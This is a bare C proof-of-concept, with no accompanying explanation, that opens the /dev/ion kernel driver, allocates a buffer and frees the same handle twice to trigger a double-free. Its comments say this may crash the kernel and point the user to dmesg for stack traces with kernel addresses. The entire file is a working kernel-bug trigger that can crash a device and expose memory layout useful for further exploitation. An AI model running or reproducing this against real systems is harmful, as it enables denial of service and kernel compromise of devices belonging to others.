#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>

typedef int ion_user_handle_t;
struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    ion_user_handle_t handle;
};
struct ion_handle_data {
    ion_user_handle_t handle;
};

#define ION_IOC_MAGIC   'I'
#define ION_IOC_ALLOC   _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)

int main(void) {
    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) { perror("open"); return 1; }

    struct ion_allocation_data alloc = {0};
    alloc.len = 4096;
    alloc.align = 4096;
    alloc.heap_id_mask = 1; /* system heap */
    
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
        perror("alloc");
        return 1;
    }
    printf("[*] Allocated handle=%d\n", alloc.handle);

    struct ion_handle_data hd = { .handle = alloc.handle };
    
    /* First free - should succeed */
    int ret = ioctl(ion_fd, ION_IOC_FREE, &hd);
    printf("[*] First free: %s (ret=%d)\n", ret ? "FAIL" : "OK", ret);

    /* Second free - should trigger kernel warning/crash */
    printf("[*] Attempting double-free (may crash kernel)...\n");
    printf("[*] Check dmesg after this for kernel traces\n");
    fflush(stdout);
    
    ret = ioctl(ion_fd, ION_IOC_FREE, &hd);
    printf("[*] Second free: %s (ret=%d, errno=%d)\n", 
           ret ? "FAIL" : "OK", ret, errno);

    close(ion_fd);
    printf("[*] Done. Check dmesg for kernel stack traces with addresses.\n");
    return 0;
}
